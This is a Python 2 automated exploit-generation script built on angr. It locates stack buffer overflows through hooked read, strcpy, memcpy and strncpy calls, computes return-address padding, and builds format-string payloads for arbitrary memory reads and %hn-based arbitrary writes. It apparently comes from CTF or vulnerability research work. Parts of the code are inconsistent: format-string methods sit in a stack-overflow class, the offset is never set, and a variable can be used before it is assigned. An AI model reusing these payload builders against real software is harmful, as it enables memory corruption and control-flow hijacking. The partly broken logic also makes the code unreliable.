#!/usr/bin/env python2
#-*-coding:utf-8 -*-
import angr
import commands
import claripy
import struct
import staticScan
import copy
#from pwn import *

class StackFinder(object):
    def __init__(self,binary,printf_plt=0,hooks=[],eip_addr=0,read_addr=0,write_addr=0,write_val=0,static_flag=True):
        self.binary=binary
        self.printf_plt=printf_plt
        self.hooks=hooks
        self.eip_addr=eip_addr
        self.read_addr=read_addr
        self.write_addr=write_addr
        self.write_val=write_val
        self.static_flag=static_flag

        self.read_func_addr=0
        self.scanf_addr=0
        self.strcpy_addr=0
        self.memcpy_addr=0
        self.strncpy_addr=0
        self.input_addr=0

        #self.vul_func=['read','memcpy','']

        self.bug_flag=False #If we have got a fmt bug?
        self.bug_addr=0
        self.fmt_offset=0   #How long to get to %s.
        self.pre_input=''   #To get to bug point.
        self.bug_type=''    #
        self.pre_payload='' #String before %.


        self.crash_payload=''
        self.eip_payload=''
        self.any_read_payload=''
        self.any_write_payload=''

        self.rodata_min_addr=0
        self.rodata_max_addr=0

    def run(self):
        self._p=angr.Project(self.binary,load_options={"auto_load_libs": False})
        #self._p.hook(0x080483B0,angr.SIM_PROCEDURES['glibc']['__libc_start_main']()) #0x08048350
        if (not self.hooks) and (self.static_flag):
            static_func=staticScan.StaticScan(self.binary,'2333.sig',0x08048000)
            self.hooks=copy.deepcopy(static_func.hooks)

        for a in self.hooks:
            if angr.procedures.linux_kernel.read.read==a[1]:
                print "read_func_addr=",hex(a[0])
                read_func_addr=a[0]
            if angr.procedures.libc.strcpy.strcpy==a[1]:
                print "strcpy_func_addr=",hex(a[0])
                self.strcpy_addr=a[0]
            if angr.procedures.libc.scanf.scanf==a[1]:
                print "scanf_func_addr=",hex(a[0])
                self.scanf_addr=a[0]
            if angr.procedures.libc.memcpy.memcpy==a[1]:
                print "memcpy_func_addr=",hex(a[0])
                self.memcpy_addr=a[0]
            if angr.procedures.libc.strncpy.strncpy==a[1]:
                print "strncpy_func_addr=",hex(a[0])
                self.strncpy_addr=a[0]
            self._p.hook(a[0],a[1])

        if (not self.read_func_addr) and self.static_flag:
            print "This binary is a static binary!"
            self.read_func_addr=read_func_addr
        elif (not self.read_func_addr) and (not self.static_flag):
            self.read_func_addr=self.get_read_plt()

        if not self.read_func_addr and not self.scanf_addr:
            return 0

        self.get_rodata_addr()
        state = self._p.factory.entry_state()
        sm = self._p.factory.simgr(state)
        sm = sm.explore(find=self.check)
        #if self.bug_flag:
        #   self.attack()
        return 1

    def get_read_plt(self):
        '''
        In dynamic program, to get printf_plt address.
        '''
        if 'read' in self._p.loader.main_object.plt:
            #print hex(self._p.loader.main_object.plt['printf'])
            print 'read_addr=',hex(self._p.loader.main_object.plt['read'])
            return self._p.loader.main_object.plt['read']
        return 0

    def get_rodata_addr(self):
        '''
        Format string sometimes is in .rodata! 
        We can get .rodata address.
        '''
        if '.rodata' in self._p.loader.main_object.sections_map:
            self.rodata_min_addr=self._p.loader.main_object.sections_map['.rodata'].min_addr
            self.rodata_max_addr=self._p.loader.main_object.sections_map['.rodata'].max_addr
        print 'rodata_addr:',hex(self.rodata_min_addr),'->',hex(self.rodata_max_addr)
        return 0

    def get_prestring(self,str1):
        '''
        To get concrete string, not symbolic!
        '''
        ret=''
        for i in range(len(str1)):
            if ord(str1[i])==0:
                ret+=str1[:i]
                break
        return ret

    def check(self,state):
        '''
        To judge whether we have got a Fmt crash.
        If fmt string is out of program address, it may be a fmt bug.
        '''
        #print 'Address:',hex(state.se.eval(state.regs.eip))
        if state.se.eval(state.regs.eip)==self.read_func_addr:
            target_address,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+8,4),cast_to=str))
            self.input_addr=target_address
            print 'input_addr=',hex(self.input_addr)
            ret=state.se.eval(state.regs.ebp+4,cast_to=int)
            argu3,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+12,4),cast_to=str))
            interval=ret-target_address
            if interval>0 and interval<argu3:
                print 'interval=',interval
                print 'input_string_length=',argu3
                self.bug_flag=True
                self.pre_input='a'*interval
                #argu1,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))
                #state.add_constraints(struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))[0] == self.eip_addr)
                #self.eip_payload=state.posix.dumps(0)
                return True

        if state.se.eval(state.regs.eip)==self.scanf_addr:
            target_address,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+8,4),cast_to=str))
            self.input_addr=target_address
            print 'input_addr=',hex(self.input_addr)
            '''
            ret=state.se.eval(state.regs.ebp+8,cast_to=int)
            argu3,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+12,4),cast_to=str))
            interval=ret-target_address
            if interval>0 and interval<=argu3:
                print 'interval=',interval
                print 'length=',argu3
                self.bug_flag=True
                argu1,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))
                state.add_constraints(struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))[0] == self.eip_addr)
                self.eip_payload=state.posix.dumps(0)
                return True
                '''
        if state.se.eval(state.regs.eip)==self.strcpy_addr:
            dest,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))
            src,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+8,4),cast_to=str))
            print 'src_addr=',hex(src)
            if self.input_addr>0 and self.input_addr==src:
                ret=state.se.eval(state.regs.ebp)+4
                offset=ret-dest
                print 'Length of data to ret_addr=',offset
                self.pre_input=self.get_prestring(state.posix.dumps(0))
                print "Length of pre_input=",hex(len(self.pre_input))
                if len(self.pre_input)<=offset and offset>0:
                    self.pre_input+='a'*(offset-len(self.pre_input))
                    print 'pre_input=',self.pre_input
                    return True
        if state.se.eval(state.regs.eip)==self.memcpy_addr:
            dest,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))
            src,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+8,4),cast_to=str))
            print 'src_addr=',hex(src)
            if self.input_addr>0 and self.input_addr==src:
                ret=state.se.eval(state.regs.ebp)+4
                offset=ret-dest
                print 'Length of data to ret_addr=',offset
                self.pre_input=self.get_prestring(state.posix.dumps(0))
                print "Length of pre_input=",hex(len(self.pre_input))
                if len(self.pre_input)<=offset and offset>0:
                    self.pre_input+='a'*(offset-len(self.pre_input))
                    print 'pre_input=',self.pre_input
                    return True
        if state.se.eval(state.regs.eip)==self.strncpy_addr:
            dest,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+4,4),cast_to=str))
            src,=struct.unpack('=i',state.se.eval(state.memory.load(state.regs.esp+8,4),cast_to=str))
            print 'src_addr=',hex(src)
            if self.input_addr>0 and self.input_addr==src:
                ret=state.se.eval(state.regs.ebp)+4
                offset=ret-dest
                print 'Length of data to ret_addr=',offset
                self.pre_input=self.get_prestring(state.posix.dumps(0))
                print "Length of pre_input=",hex(len(self.pre_input))
                if len(self.pre_input)<=offset and offset>0:
                    self.pre_input+='a'*(offset-len(self.pre_input))
                    print 'pre_input=',self.pre_input
                    return True
        return False

    def crash(self):
        '''
        To construct crash data.
        '''
        payload=''
        payload=self.pre_payload+'[Result]:'
        len_p=len(payload)   #len_p / 4 +3(padding)+1(addr)
        len_padding=(len_p/4+3)*4
        off_addr=(len_p+self.fmt_offset)/4+3
        #off_addr=int(off_addr,10)
        payload+='%'
        payload+=str(off_addr)
        payload+='$s'
        payload=payload.ljust(len_padding,'A')
        payload+='\x01\x01\x01\x01'
        self.crash_payload=self.pre_input+payload
        #print "crash payload=",repr(payload)
        return 0

    def any_read(self):
        '''
        To read data from any given address.
        '''
        payload=''
        payload=self.pre_payload+'[Result]:'
        len_p=len(payload)   #len_p / 4 +3(padding)+1(addr)
        len_padding=(len_p/4+3)*4
        off_addr=(len_p+self.fmt_offset)/4+3
        #off_addr=int(off_addr,10)
        payload+='%'
        payload+=str(off_addr)
        payload+='$s'
        payload=payload.ljust(len_padding,'A')
        payload+=struct.pack("I",self.read_addr)    
        self.any_read_payload=self.pre_input+payload
        #print "any_read payload=",repr(payload)
        return 0

    def any_write(self):
        '''
        To write any data at any address.
        '''
        high=self.write_val>>16
        low=self.write_val & 0xffff
        payload=''
        payload=self.pre_payload
        len_p=len(payload)
        len_padding=(len_p/4+8)*4
        off_addr=(len_p+self.fmt_offset)/4+8
        if high<low:
            high_p=high-len_p
            low_p=(self.write_val-len_p-high_p) & 0xffff
            payload+='%'
            payload+=str(high_p)
            payload+='c%'
            payload+=str(off_addr)
            payload+='$hn'
            payload+='%'
            payload+=str(low_p)
            payload+='c%'
            payload+=str(off_addr+1)
            payload+='$hn'
            payload=payload.ljust(len_padding,'A')
            payload+=struct.pack("I",self.write_addr+2)          
            payload+=struct.pack("I",self.write_addr)
            #print "write_addr:",hex(self.write_addr)
            #print repr(struct.pack("I",self.write_addr))
        else:
            low_p=low-len_p
            high_p=high-len_p-low_p
            payload+='%'
            payload+=str(low_p)
            payload+='c%'
            payload+=str(off_addr)
            payload+='$hn'
            payload+='%'
            payload+=str(high_p)
            payload+='c%'
            payload+=str(off_addr+1)
            payload+='$hn'
            payload=payload.ljust(len_padding,'A')
            payload+=struct.pack("I",self.write_addr)          
            payload+=struct.pack("I",self.write_addr+2)
        self.any_write_payload=self.pre_input+payload
        #print "any_write payload=",repr(payload)
        return 0

    def attack(self):
        '''
        Start to construct exploit data.
        '''
        self.crash()
        if self.bug_type=='read_write' and self.read_addr:
            self.any_read()
        if self.write_addr and self.write_val:
            self.any_write()
        return 0

    def result_display(self):
        '''
        Pretty print the result.
        '''
        if self.bug_flag:
            print "------------***   Let's pretty print the results  ***------------"
            print 'The crash type is : ',self.bug_type
            print 'The fmt_offset is : ',self.fmt_offset
            print len(self.pre_input)
            print 'The crash pre_input is : ',self.pre_input
            print 'The crash pre_payload is : ',self.pre_payload
            print "crash payload=",repr(self.crash_payload)
            print "any_read payload=",repr(self.any_read_payload)
            print "any_write payload=",repr(self.any_write_payload)



def test_static(binary):
    aa=StackFinder(binary,eip_addr=0x65656565,read_addr=0x080B2D80,write_addr=0x080D50A0,write_val=0x49496565)#0x080483C0
    aa.run()
    #if aa.bug_flag:
    #   print 'length of payload=',len(aa.eip_payload)
    #   print 'payload=',repr(aa.eip_payload)
    #   print aa.eip_payload[27]
    #.rodata:080B2D80 aFatalCannotDet db 'FATAL: cannot determine kernel version',0Ah,0
    #.data:080D50A0 aCccccccccccccc db 'ccccccccccccccccccccccccc',0


if __name__ == '__main__':
    #test1('./fmt_pre_test')
    #test2('./fmt2_test')
    #test3('./fmt_pre_test')
    test_static('./YY_IO_BS_005_eip')
